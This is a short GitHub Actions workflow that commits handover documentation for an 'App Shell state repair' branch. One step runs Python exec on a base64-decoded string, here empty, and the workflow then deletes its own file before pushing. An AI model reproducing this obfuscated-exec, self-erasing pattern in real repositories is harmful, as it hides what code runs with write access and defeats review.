name: Finalize App Shell state repair administration

on: [push]

permissions:
  contents: write

jobs:
  finalize:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: wp/premium-app-shell-post-merge-state-repair
          fetch-depth: 0
      - name: Apply administration
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Self-clean and commit administration
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          rm .github/workflows/finalize-post-merge-state-repair-admin.yml
          git add CHANGELOG.md WORKPACKAGES.md RELEASE_NOTES.md handover/workpackages/20260808_2035_premium_app_shell_post_merge_state_repair.md .github/workflows/finalize-post-merge-state-repair-admin.yml
          git commit -m "docs(ui): record post-merge state repair handover"
          git push origin HEAD:wp/premium-app-shell-post-merge-state-repair
